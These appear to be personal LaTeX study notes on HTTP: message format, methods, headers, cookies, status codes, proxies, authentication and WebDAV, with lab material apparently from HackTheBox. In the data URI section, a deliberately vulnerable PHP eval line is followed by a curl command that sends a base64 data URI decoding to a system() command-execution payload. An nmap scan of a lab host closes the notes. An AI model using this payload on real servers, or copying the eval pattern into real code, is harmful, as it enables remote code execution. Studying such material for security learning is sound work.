\section{HTTP protocol}

HTTP use a  message-based connectionless model
\subsection{HTTP requests}

Message composed one or more headers, each on a separate line, followed by a mandatory blank line, followed by an optional message body. 

\begin{verbatim}
GET /books/search.asp?q=wahh HTTP/1.1
Accept: image/gif, image/xxbitmap, image/jpeg, image/pjpeg,
application/xshockwaveflash, application/vnd.msexcel,
application/vnd.mspowerpoint, application/msword, */*
Referer: http://wahh-app.com/books/default.asp
Accept-Language: en-gb,en-us;q=0.5
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: wahh-app.com
Cookie: lang=en; JSESSIONID=0000tI8rk7joMx44S2Uu85nSWc_:vsnlc502
\end{verbatim}

The first line of every HTTP request consists of three items, separated by
spaces:
\begin{itemize}
\item A verb indicating the HTTP method. 
\item The requested URL. The URL functions as a name for the resource being requested.
\item The HTTP version being used. In version 1.1 the \verb+Host+ request header is mandatory. 
\end{itemize}

Some other points of interest in the example request are:
\begin{itemize}
\item The \verb+Referer+ header is used to indicate the URL from which the request originated.
\item The \verb+User-Agent+ header is used to provide information about the browser or other client software that generated the request. 
\item The \verb+Host+ header is used to specify the hostname that appeared in the full URL being accessed. This is necessary when multiple web sites are hosted on the same server, because the URL sent in the first line of the request does not normally contain a hostname. 
\item The \verb+Cookie+ header is used to submit additional parameters that the server has issued to the client.
\end{itemize}


\subsection{HTTP Responses}
A typical HTTP response is as follows:
\begin{verbatim}
HTTP/1.1 200 OK
Date: Sat, 19 May 2007 13:49:37 GMT
Server: IBM_HTTP_SERVER/1.3.26.2 Apache/1.3.26 (Unix)
Set-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html;charset=ISO-8859-1
Content-Language: en-US
Content-Length: 24246
<!DOCTYPE html PUBLIC “-//W3C//DTD HTML 4.01 Transitional//EN”>
<html lang=”en”>
<head>
<meta http-equiv=”Content-Type” content=”text/html;
charset=iso-8859-1”>
...
\end{verbatim}

The first line of every HTTP response consists of three items, separated by spaces:
\begin{itemize}
\item The HTTP version being used.
\item the status code of the request processing
\item A textual “reason phrase” further describing the status of the response.
\end{itemize}

Some other points of interest in the previous response are:
\begin{itemize}
\item The \verb+Server+ header contains a banner indicating the web server software being used, and sometimes other details such as installed modules and the server operating system. 
\item The \verb+Set-Cookie+ header is issuing the browser a further cookie; this will be submitted back in the Cookie header of subsequent requests to this server.
\item The \verb+Pragma+ header is instructing the browser not to store the response
in its cache, and the \verb+Expires+ header also indicates that the response
content expired in the past and so should not be cached. These instruc-
tions are frequently issued when dynamic content is being returned, to
ensure that browsers obtain a fresh version of this content on subse-
quent occasions.
\item Almost all HTTP responses contain a message body following the blank
line after the headers, and the \verb+Content-Type+ header indicates that the
body of this message contains an HTML document.
\item The \verb+Content-Length+ header indicates the length of the message body in
bytes.
\end{itemize}

\subsection{HTTP Methods}

\subsubsection*{GET}
The GET method is designed for retrieval of resources. It can be used to send parameters to the requested resource in the URL query string.  URL re also transmitted in the \verb+Referer+ header to other sites when external links are followed. For these reasons, the query string should not be used to transmit any sensitive information.

\verb+GET+ requests do not have a message body, so there is no further data follow-ing the blank line after the message headers.


\subsubsection*{POST}
he \verb+POST+ method is designed for performing actions. With this method, request parameters can be sent both in the URL query string and in the body of the message. Although the URL can still be bookmarked, any parameters sent in the message body will be excluded from the bookmark. These parame- ters will also be excluded from the various locations in which logs of URLs are maintained and from the \verb+Referer+ header. Because the POST method is designed for performing actions, if a user clicks the Back button of the browser to return to a page that was accessed using this method, the browser will not automatically reissue the request but will warn the user of what it is about to do. This prevents users from unwittingly performing an action more than once. For this reason, POST requests should always be used when an action is being performed.

\subsubsection*{HEAD}
This functions in the same way as a GET request except that
the server should not return a message body in its response. The server
should return the same headers that it would have returned to the cor-
responding GET request. Hence, this method can be used for checking
whether a resource is present before making a GET request for it.
\subsubsection*{TRACE}
This method is designed for diagnostic purposes. The server
should return in the response body the exact contents of the request
message that it received. This can be used to detect the effect of any
proxy servers between the client and server that may manipulate the request. It can also sometimes be used as part of an attack against other
application users

\subsubsection*{OPTIONS}
This method asks the server to report the HTTP methods
that are available for a particular resource. The server will typically
return a response containing an Allow header that lists the available
methods.

\subsubsection*{PUT}
 This method attempts to upload the specified resource to the
server, using the content contained in the body of the request. If this
method is enabled, then you may be able to leverage it to attack the
application; for example, by uploading an arbitrary script and execut-
ing this on the server.

\subsubsection*{Other methods}

\subsection{URL}

\verb+protocol://hostname[:port]/[path/]file[?param=value]+

\subsection{data URI scheme}

\href{https://en.wikipedia.org/wiki/Data_URI_scheme}{data URI scheme}
\begin{verbatim}
data:[<media type>][;base64],<data>
\end{verbatim}


\begin{verbatim}
eval(file_get_contents($_POST['include']));


curl -k -X POST -b "PHPSESSID=5886gh38mtpkj5tc5ga13osq9c" 
    --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7"\
    'https://streamio.htb/admin/?debug=master.php&cmd=whoami'
\end{verbatim}


\subsection{HTTP Headers}

\subsubsection*{General headers}
\begin{itemize}
\item \verb+Connection+: inform the other end  to close or keep open the TCP connection after the HTTP transmission.
\item \verb+Content-Encoding+ specify the encoding is being used for
    the content contained in the message body,(gzip \dots)
\item \verb+Content-Length+ specify the length of the message
body, in bytes 
\item \verb+Content-Type+ secify the type of content contained in
    the message body (\verb+text/html+ \ldots).
\item \verb+Transfer-Encoding+ specify any encoding that was
performed on the message body to facilitate its transfer over HTTP. It is
normally used to specify chunked encoding when this is employed.
\end{itemize}

\subsubsection*{Request headers}
\begin{itemize}
\item \verb+Accept+ tell the server what kinds of content the client is willing to accept, such as image types, office document formats, and so on.
\item \verb+Accept-Encoding+ tell the server what kinds of content encoding the client is willing to accept.
\item \verb+Authorization+ used to submit credentials to the server for one of the built-in HTTP authentication types.
\item \verb+Cookie+ used to submit cookies to the server which were previously issued by it.
\item \verb+Host+ used to specify the hostname that appeared in the full URL being requested.
\item \verb+If-Modified-Since+ specify the time at which the browser last received the requested resource. If the resource has not changed since that time, the server may instruct the client to use its cached copy, using a response with status code 304.
\item \verb+If-None-Match+ specify an entity tag, which is an identifier denoting the contents of the message body. The browser submits the entity tag that the server issued with the requested resource when it was last received. The server can use the entity tag to determine whether the browser may use its cached copy of the resource.
\item \verb+Referer+ specify the URL from which the current request originated.
\item \verb+User-Agent+ provide information about the browser or other client software that generated the request.
\end{itemize}

\subsubsection*{Response headers}
\begin{itemize}
\item \verb+Cache-Control+ This is used to pass caching directives to the browser (for example, no-cache).

\item \verb+ETag+ This is used to specify an entity tag. Clients can submit this
identifier in future requests for the same resource in the If-None-Match
header to notify the server which version of the resource the browser
currently holds in its cache.
\item \verb+Expires+ This is used to instruct the browser how long the contents of
the message body are valid for. The browser may use the cached copy
of this resource until this time.
\item \verb+Location+ This is used in redirection responses (those with a status
code starting with 3) to specify the target of the redirect.
\item \verb+Pragma+ This is used to pass caching directives to the browser (for
example, no-cache).
\item \verb+Server+ This is used to provide information about the web server soft-
ware being used.
\item \verb+Set-Cookie+ This is used to issue cookies to the browser that it will
submit back to the server in subsequent requests.
\item \verb+WWW-Authenticate+ This is used in responses with a 401 status code
to provide details of the type(s) of authentication supported by the
server.

\end{itemize}
\subsection{Cookies}
The cookie mechanism enables the server to send items of data to the
client, which the client stores and resubmits back to the server.

It is requently be used as a vehicle for exploiting vulnerabil-
ities.

A server issues a cookie using the Set-Cookie response header, as already
observed:
\begin{verbatim}
Set-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
\end{verbatim}
The user’s browser will then automatically add the following header to subsequent requests back to the same server:
\begin{verbatim}
Cookie: tracking=tI8rk7joMx44S2Uu85nSWc
\end{verbatim}

Multiple cookies can be issued by using multiple Set-Cookie headers in the server’s response, and are all submitted back to the server in the same Cookie header, with a semicolon separating different individual cookies

optional attributes:
\begin{itemize}
\item \verb+expires+: Used to set a date until which the cookie is valid. This will cause the browser to save the cookie to persistent storage, and it will be reused in subsequent browser sessions until the expiration date is reached. If this attribute is not set, the cookie is used only in the current browser session
\item \verb+domain+: specify the domain for which the cookie is valid.  This must be the same or a parent of the domain from which the cookie is received.
\item \verb+path+: Used to specify the URL path for which the cookie is valid
\item \verb+secure+:  If this attribute is set, then the cookie will only ever be submit- ted in HTTPS requests
\item \verb+HttpOnly+: If this attribute is set, then the cookie cannot be directly accessed via client-side JavaScript, although not all browsers support this restriction.
\end{itemize}

\subsection{Status Codes}

\begin{itemize}
\item 100-199 (Information Response) These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.
\item 200-299 (Success) This range of status codes is used to tell the client their request was successful.
\item 300-399 (Redirection) These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether.
\item 400-499 (Client Errors) Used to inform the client that there was an error with their request.
\item 500-599 (Server Errors) This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.
\end{itemize}

\subsubsection*{Common HTTP Status Codes}


\begin{itemize}
    \item 200 (OK) The request was completed successfully. 
    \item 201 (Created)  A resource has been created (for example a new user or new blog post). 
    \item 301 (Permanent Redirect)  This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. 
    \item 302 (Temporary Redirect)  Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future. 
    \item 400 (Bad Reques)t  This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn't send. 
    \item 401 (Not Authorised)  You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password. 
    \item 403 (Forbidden)  You do not have permission to view this resource whether you are logged in or not. 
    \item 405 (Method Not Allowed)  The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead. 
    \item 404 (Page Not Found)  The page/resource you requested does not exist. 
    \item 500 (Internal Service Error)  The server has encountered some kind of error with your request that it doesn't know how to handle properly. 
    \item 503 (Service Unavailable) : the application accessed via the server is not responding
\end{itemize}


\subsection{HTTPS}

\subsection{HTTP Proxies}
An HTTP proxy server is a server that mediates access between the client
browser and the destination web server. When a browser has been configured
to use a proxy server, it makes all of its requests to that server, and the proxy
relays the requests to the relevant web servers, and forwards their responses
back to the browser. Most proxies also provide additional services, including
caching, authentication, and access control.
There are two differences in the way HTTP works when a proxy server is
being used, which you should be aware of:
\begin{itemize}
    \item When a browser issues an HTTP request to a proxy server, it places the
full URL into the request, including the protocol prefix http:// and the
hostname of the server. The proxy server extracts the hostname and
uses this to direct the request to the correct destination web server.
\item  When HTTPS is being used, the browser cannot perform the SSL hand-
shake with the proxy server, as this would break the secure tunnel and
leave the communications vulnerable to interception attacks. Hence, the
browser must use the proxy as a pure TCP-level relay, which passes all
network data in both directions between the browser and the destina-
tion web server, with which the browser performs an SSL handshake as
normal. To establish this relay, the browser makes an HTTP request to
the proxy server using the CONNECT method and specifying the destina-
tion hostname and port number as the URL. If the proxy allows the
request, it returns an HTTP response with a 200 status, keeps the TCP
connection open, and from that point onwards acts as a pure TCP-level
relay to the destination web server
\end{itemize}

\subsection{HTTP Authentication}
The HTTP protocol includes its own mechanisms for authenticating users,
using various authentication schemes, including:

\begin{itemize}
\item Basic:  very simple authentication mechanism that sends
user credentials as a Base64-encoded string in a request header with
each message.
\item NTLM: chhallenge-response mechanism and uses a version of
the Windows NTLM protocol.
\item Digest: challenge-response mechanism and uses MD5
checksums of a nonce with the user’s credentials. 
It is relatively rare to encounter these authentication protocols being used by
web applications deployed on the Internet, although they are more commonly
used within organizations to access intranet-based services.
\end{itemize}


\section{HTTP extensions}
\subsection{WebDAV}
WebDAV (Web Distributed Authoring and Versioning) is a set of extensions to the
Hypertext Transfer Protocol (HTTP), which allows user agents to collaboratively
author contents directly in an HTTP web server by providing facilities for
concurrency control and namespace operations, thus allowing Web to be viewed as
a writeable, collaborative medium and not just a read-only medium. WebDAV is
defined in RFC 4918.

The WebDAV protocol provides a framework for users to create, change and move
documents on a server. The most important features include the maintenance of
properties about an author or modification date, namespace management,
collections, and overwrite protection. Maintenance of properties includes such
things as the creation, removal, and querying of file information. Namespace
management deals with the ability to copy and move web pages within a server's
namespace. Collections deal with the creation, removal, and listing of various
resources. Lastly, overwrite protection handles aspects related to the locking
of files. It takes advantage of existing technologies such as Transport Layer
Security, digest access authentication or XML to satisfy those requirements.

Many modern operating systems provide built-in client-side support for WebDAV. 

WebDAV extends the set of standard HTTP verbs and headers allowed for request methods. The added verbs include:
\begin{itemize}
 \item   COPY: copy a resource from one uniform resource identifier (URI) to another
 \item   LOCK: put a lock on a resource. WebDAV supports both shared and exclusive locks.
 \item   MKCOL: create collections (also known as a directory)
 \item   MOVE: move a resource from one URI to another
 \item   PROPFIND: retrieve properties, stored as XML, from a web resource. It
     is also overloaded to allow one to retrieve the collection structure (also
     known as directory hierarchy) of a remote system.
 \item   PROPPATCH: change and delete multiple properties on a resource in a
     single atomic act
 \item   UNLOCK: remove a lock from a resource
\end{itemize}


\begin{verbatim}
sudo nmap -sV -sC -oX nmap.xml 10.10.10.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 16:38 CEST
Nmap scan report for 10.10.10.15
Host is up (0.028s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
| Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, S
| WebDAV type: Unknown
| Server Date: Sat, 01 Oct 2022 14:38:56 GMT
| Server Type: Microsoft-IIS/6.0
|_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPF
|_http-title: Under Construction
| http-methods:
|_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
\end{verbatim}
